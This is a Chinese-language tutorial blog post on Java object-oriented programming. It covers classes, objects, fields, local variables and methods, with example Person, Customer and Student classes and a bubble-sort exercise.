    <content type="html"><![CDATA[    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1381676207&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <h2 id="1-java-面向对象学习的三条主线"><a href="#1-java-面向对象学习的三条主线" class="headerlink" title="1. java 面向对象学习的三条主线"></a>1. java 面向对象学习的三条主线</h2><ol><li>Java 类及类的成员：属性、方法、构造器；代码块、内部类</li><li>面向对象的三大特征：封装性、继承性、多态性、(抽象性)</li><li>其它关键字：this、super、static、final、abstract、interface、package、import 等</li></ol><h2 id="2-面向对象和面向过程的区别"><a href="#2-面向对象和面向过程的区别" class="headerlink" title="2. 面向对象和面向过程的区别"></a>2. 面向对象和面向过程的区别</h2><h3 id="面向过程：强调的是功能行为，以函数为最小单位，考虑怎么做。"><a href="#面向过程：强调的是功能行为，以函数为最小单位，考虑怎么做。" class="headerlink" title="面向过程：强调的是功能行为，以函数为最小单位，考虑怎么做。"></a>面向过程：强调的是功能行为，以函数为最小单位，考虑怎么做。</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">① 把冰箱门打开</span><br><span class="line">② 抬起大象，塞进冰箱</span><br><span class="line">② 把冰箱门关闭</span><br></pre></td></tr></table></figure><h3 id="面向对象：强调具备了功能的对象，以类-对象为最小单位，考虑谁来做。"><a href="#面向对象：强调具备了功能的对象，以类-对象为最小单位，考虑谁来做。" class="headerlink" title="面向对象：强调具备了功能的对象，以类&#x2F;对象为最小单位，考虑谁来做。"></a>面向对象：强调具备了功能的对象，以类&#x2F;对象为最小单位，考虑谁来做。</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">人&#123;</span><br><span class="line">         打开(冰箱)&#123;</span><br><span class="line">             冰箱.开开();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         抬起(大象)&#123;</span><br><span class="line">             大象.进入(冰箱);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         关闭(冰箱)&#123;</span><br><span class="line">             冰箱.闭合();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">冰箱&#123;</span><br><span class="line">          开开()&#123;&#125;</span><br><span class="line">         闭合()&#123;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">大象&#123;</span><br><span class="line">         进入(冰箱)&#123;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-面向对象的两个要素："><a href="#3-面向对象的两个要素：" class="headerlink" title="3. 面向对象的两个要素："></a>3. 面向对象的两个要素：</h2><blockquote><p>类：对一类事物的描述，是抽象的、概念上的定义<br>对象：是实际存在的该类事物的每个个体，因而也称为实例(instance)<br>面向对象程序设计的重点是类的设计。设计类，就是设计类的成员。</p></blockquote><h2 id="4-类和对象的使用"><a href="#4-类和对象的使用" class="headerlink" title="4. 类和对象的使用"></a>4. 类和对象的使用</h2><ol><li>创建类，设计类的成员<ol><li>属性 &#x3D; 成员变量 &#x3D; field &#x3D; 域、字段</li><li>方法 &#x3D; 成员方法 &#x3D; 函数 &#x3D; method</li><li>创建类的对象 &#x3D; 类的实例化 &#x3D; 实例化类</li></ol></li><li>创建类的对象</li><li>通过“对象.属性”或“对象.方法”调用对象的结构</li><li>如果创建了一个类的多个对象，则每个对象都独立的拥有一套类的属性。（非 static 的）意味着：如果我们修改一个对象的属性 a，则不影响另外一个对象属性 a 的值。</li></ol><h3 id="java-代码"><a href="#java-代码" class="headerlink" title="java 代码"></a>java 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//2. 创建Person类的对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用对象的结构：属性、方法</span></span><br><span class="line">        <span class="comment">//调用属性：“对象.属性”</span></span><br><span class="line">        p1.name = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">        p1.isMale = <span class="literal">true</span>;</span><br><span class="line">        System.out.println(p1.name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用方法：“对象.方法”</span></span><br><span class="line">        p1.eat();</span><br><span class="line">        p1.talk(<span class="string">&quot;中文&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        System.out.println(p2.name);        <span class="comment">//null</span></span><br><span class="line">        System.out.println(p2.isMale);      <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//将p1变量保存的对象地址值赋给p3,导致p1和p3指向了堆空间中的同一个对象实体。</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p3</span> <span class="operator">=</span> p1;</span><br><span class="line">        System.out.println(p3.name);        <span class="comment">//Tom</span></span><br><span class="line"></span><br><span class="line">        p3.age = <span class="number">10</span>;</span><br><span class="line">        System.out.println(p1.age);         <span class="comment">//10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.创建类，设计类的成员</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">boolean</span> isMale;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">talk</span><span class="params">(String language)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;说的是&quot;</span> + language);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-类中属性的使用"><a href="#5-类中属性的使用" class="headerlink" title="5. 类中属性的使用"></a>5. 类中属性的使用</h2><p>属性（成员变量） vs 局部变量</p><ol><li>相同点：<ol><li>定义变量的格式：数据类型 变量名 &#x3D; 变量值</li><li>先声明，后使用</li><li>变量都有其对应的作用域</li></ol></li><li>不同点：<ol><li>在类中声明的位置的不同<blockquote><p>属性：直接定义在类的一对{}内<br>局部变量：声明在方法内、方法形参、代码块内、构造器形参、构造器内部的变量</p></blockquote></li><li>关于权限修饰符的不同<blockquote><p>属性：可以在声明属性时，指明其权限，使用权限修饰符。<br>常用的权限修饰符：private、public、缺省(default)、protected —&gt;封装性。缺省常用。<br>局部变量：不可以使用权限修饰符。</p></blockquote></li><li>默认初始化值的情况：<ol><li>属性：类的属性，根据其类型，都有默认初始化值。<ol><li>整型（byte、short、int、long）：0</li><li>浮点型（float、double）：0.0</li><li>字符型（char）：0 （或’\u0000’）</li><li>布尔型（boolean）：false</li><li>引用数据类型（类、数组、接口）：null</li></ol></li><li>局部变量：没有默认初始化值。<ol><li>意味着，我们在调用局部变量之前，一定要显式赋值。</li><li>特别地：形参在调用时，我们赋值即可。</li></ol></li><li>在内存中加载的位置：<ol><li>属性：加载到堆空间中 （非 static）</li><li>局部变量：加载到栈空间</li></ol></li></ol></li></ol></li></ol><h2 id="6-类中方法的声明和使用"><a href="#6-类中方法的声明和使用" class="headerlink" title="6. 类中方法的声明和使用"></a>6. 类中方法的声明和使用</h2><h3 id="1-方法：描述类应该具有的功能。"><a href="#1-方法：描述类应该具有的功能。" class="headerlink" title="1. 方法：描述类应该具有的功能。"></a>1. 方法：描述类应该具有的功能。</h3><blockquote><p>比如：Math 类：sqrt()\random() ...<br>Scanner 类：nextXxx() …<br>Arrays 类：sort() \ binarySearch() \ toString() \ equals() \ …</p><p>下面是自己写的类：<br>public void eat(){}<br>public void sleep(int hour){}<br>public String getName(){}<br>public String getNation(String nation){}</p></blockquote><h3 id="2-方法的声明："><a href="#2-方法的声明：" class="headerlink" title="2. 方法的声明："></a>2. 方法的声明：</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">权限修饰符  返回值类型  方法名(形参列表)&#123;</span><br><span class="line">                    方法体</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure><p>注意：static、final、abstract 来修饰的方法</p><h3 id="3-Tip"><a href="#3-Tip" class="headerlink" title="3. Tip"></a>3. Tip</h3><ol><li>关于权限修饰符：默认方法的权限修饰符先都使用 public。<br>Java 规定的 4 种权限修饰符：private、public、缺省、protected</li><li>返回值类型： 有返回值 vs 没有返回值<ol><li>如果方法有返回值，则必须在方法声明时，指定返回值的类型。并用 return 关键字来返回指定类型的变量或常量：“return 数据”。<br>如果方法没有返回值，用 void 来表示。通常，没有返回值则不需要使用 return.但是，如果使用的话，只能“return;”表示结束此方法的意思。</li><li>我们定义方法该不该有返回值？<ol><li>题目要求</li><li>凭经验</li></ol></li></ol></li><li>方法名：属于标识符，遵循标识符的规则和规范，“见名知意”</li><li>形参列表： 方法可以声明 0 个，1 个，或多个形参。<ol><li>格式：数据类型 1 形参 1,数据类型 2 形参 2,…</li><li>我们定义方法时，该不该定义形参？<ol><li>题目要求</li><li>凭经验</li></ol></li></ol></li><li>方法体：方法功能的体现。</li><li>return 关键字的使用：<ol><li>使用范围：使用在方法体中</li><li>作用：<ol><li>结束方法</li><li>针对于有返回值类型的方法，使用”return 数据”方法返回所要的数据。</li></ol></li><li>注意点：return 关键字后面不可以声明执行语句。</li></ol></li><li>方法的使用中，可以调用当前类的属性或方法<br>特殊的：方法 A 中又调用了方法 A:递归方法。<br>方法中，不可以定义方法。</li><li>可以直接在同一个包下面定义自己的类，名字尾缀为 java，最开始不需要 import</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * sex:1 表明是男性</span></span><br><span class="line"><span class="comment">     * sex:0 表明是女性</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;studying&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;age:&quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">addAge</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        age += i;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 要求：</span></span><br><span class="line"><span class="comment"> * (1)创建Person类的对象，设置该对象的name、age和sex属性，调用study方法，</span></span><br><span class="line"><span class="comment"> * 输出字符串“studying”，调用showAge()方法显示age值，</span></span><br><span class="line"><span class="comment"> * 调用addAge()方法给对象的age属性值增加2岁。</span></span><br><span class="line"><span class="comment"> * (2)创建第二个对象，执行上述操作，体会同一个类的不同对象之间的关系。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        p1.name = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">        p1.age = <span class="number">18</span>;</span><br><span class="line">        p1.sex = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        p1.study();</span><br><span class="line">        p1.showAge();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">newAge</span> <span class="operator">=</span> p1.addAge(<span class="number">2</span>);</span><br><span class="line">        System.out.println(p1.name + <span class="string">&quot;的新年龄为：&quot;</span> + newAge);</span><br><span class="line">        System.out.println(p1.age);             <span class="comment">//20</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p2.showAge();                           <span class="comment">//0</span></span><br><span class="line">        p2.addAge(<span class="number">10</span>);</span><br><span class="line">        p2.showAge();                           <span class="comment">//10</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-java-代码"><a href="#4-java-代码" class="headerlink" title="4. java 代码"></a>4. java 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">cust1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>();</span><br><span class="line">        <span class="comment">//cust1.eat();      报错</span></span><br><span class="line">        cust1.sleep(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Customer</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">boolean</span> isMale;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;客户吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span>  hour)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;休息了&quot;</span> + hour + <span class="string">&quot;个小时&quot;</span>);</span><br><span class="line">        eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (age &gt; <span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNation</span><span class="params">(String nation)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;国籍为&quot;</span> + nation;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        System.out.println(u1.name);</span><br><span class="line">        System.out.println(u1.age);</span><br><span class="line">        System.out.println(u1.isMale);</span><br><span class="line"></span><br><span class="line">        u1.talk(<span class="string">&quot;汉语&quot;</span>);</span><br><span class="line">        u1.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="comment">//属性（或成员变量）</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="type">boolean</span> isMale;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">talk</span><span class="params">(String language)</span>&#123;           <span class="comment">//局部变量</span></span><br><span class="line">        System.out.println(<span class="string">&quot;我们用&quot;</span> + language);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">food</span> <span class="operator">=</span> <span class="string">&quot;饼&quot;</span>;                      <span class="comment">//局部变量</span></span><br><span class="line">        System.out.println(<span class="string">&quot;一个&quot;</span> + food);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student1[] s1 = <span class="keyword">new</span> <span class="title class_">Student1</span>[<span class="number">20</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s1.length; i++) &#123;</span><br><span class="line">            s1[i] = <span class="keyword">new</span> <span class="title class_">Student1</span>();</span><br><span class="line">            s1[i].number = (i + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//年级：[1,6]</span></span><br><span class="line">            s1[i].state = (<span class="type">int</span>)(Math.random() * (<span class="number">6</span> - <span class="number">1</span> + <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//成绩：[0,100]</span></span><br><span class="line">            s1[i].score = (<span class="type">int</span>) (Math.random() * (<span class="number">100</span> - <span class="number">0</span> + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StudentTest1</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StudentTest1</span>();</span><br><span class="line">        test.print(s1);</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        test.seacchState(s1, <span class="number">3</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        test.sort(s1);</span><br><span class="line">        test.print(s1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 遍历学生数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> s1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(Student1[] s1)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s1.length; i++) &#123;</span><br><span class="line">            System.out.println(s1[i].info());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *问题一：打印出指定年级的学生信息。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> s1 要查找的数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> state 要查找的年级</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">seacchState</span><span class="params">(Student1[] s1, <span class="type">int</span> state)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s1.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s1[i].state == state)&#123;</span><br><span class="line">                System.out.println(s1[i].info());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用冒泡排序按学生成绩排序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> s1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(Student1[] s1)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s1.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; s1.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s1[j].score &gt; s1[j + <span class="number">1</span>].score)&#123;</span><br><span class="line">                    <span class="comment">//注意这里交换的是对象</span></span><br><span class="line">                    <span class="type">Student1</span> <span class="variable">temp</span> <span class="operator">=</span> s1[j];</span><br><span class="line">                    s1[j] = s1[j + <span class="number">1</span>];</span><br><span class="line">                    s1[j + <span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student1</span>&#123;</span><br><span class="line">    <span class="type">int</span> number;;    <span class="comment">//学号</span></span><br><span class="line">    <span class="type">int</span> state;      <span class="comment">//年级</span></span><br><span class="line">    <span class="type">int</span> score;      <span class="comment">//成绩</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//显示学生信息</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">info</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;学号：&quot;</span> + number + <span class="string">&quot;,年级：&quot;</span> + state + <span class="string">&quot;,成绩：&quot;</span> + score;</span><br><span class="line">    &#125;</span><br><span 